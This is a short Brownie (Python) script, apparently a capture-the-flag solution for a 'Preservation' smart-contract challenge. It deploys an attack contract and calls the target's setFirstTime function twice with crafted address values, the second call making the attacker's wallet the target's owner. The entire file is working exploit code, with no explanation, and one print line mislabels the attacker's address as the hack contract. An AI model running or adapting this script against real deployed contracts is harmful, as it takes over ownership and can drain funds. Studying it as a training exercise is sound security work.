from brownie import accounts, config, convert, interface, PreservationAttack

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    target = interface.PreservationInterface(target)
    print(f'Target owner: {target.owner()}')
    hack = PreservationAttack.deploy({'from': hacker})
    print(f'Hack contract: {hacker.address}')
    first_one = convert.to_uint(convert.to_bytes(hack.address))
    target.setFirstTime(first_one, {'from': hacker})
    print('First step done ;)')
    second_one = convert.to_uint(convert.to_bytes(hacker.address))
    target.setFirstTime(second_one, {'from': hacker})
    print(f'Target owner: {target.owner()}')
